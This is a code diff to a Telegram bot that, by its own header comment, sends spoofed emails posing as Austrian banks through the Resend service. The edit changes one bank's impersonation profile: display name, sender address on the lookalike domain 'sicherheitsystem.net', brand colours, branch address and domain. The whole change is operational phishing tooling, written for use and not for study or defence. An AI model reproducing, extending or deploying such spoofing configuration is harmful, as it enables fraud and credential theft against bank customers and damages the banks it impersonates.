@@ -1,4 +1,4 @@
-// Telegram bot for sending bank spoof emails (VB/BAWAG/RBI/Erste/bank99/HYPO NOE/Burgenland/Oberbank/DADAT/Dolomiten/Marchfelder) via Resend
+// Telegram bot for sending bank spoof emails (VB/BAWAG/RBI/Erste/bank99/HYPO/Burgenland/Oberbank/DADAT/Dolomiten/Marchfelder) via Resend
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
@@ -120,17 +120,17 @@ const BANKS: Record<BankKey, BankConfig> = {
   },
   hyponoe: {
     key: "hyponoe",
-    name: "HYPO NOE",
-    fullName: "HYPO NOE Landesbank für Niederösterreich und Wien AG",
-    fromName: "HYPO NOE Landesbank",
-    fromEmail: "hyponoe@sicherheitsystem.net",
+    name: "HYPO",
+    fullName: "HYPO Landesbank",
+    fromName: "HYPO Landesbank",
+    fromEmail: "hypo@sicherheitsystem.net",
     accent: "#142d59",
     topbar: "#142d59",
     border: "#142d59",
-    address: "Hypogasse 1, 3100 St. Pölten",
-    domain: "hyponoe.at",
-    schalter: "HYPO-NOE-Schalter",
-    filiale: "HYPO-NOE-Filiale",
+    address: "Österreich",
+    domain: "hypo.at",
+    schalter: "HYPO-Schalter",
+    filiale: "HYPO-Filiale",
   },
   burgenland: {
     key: "burgenland",
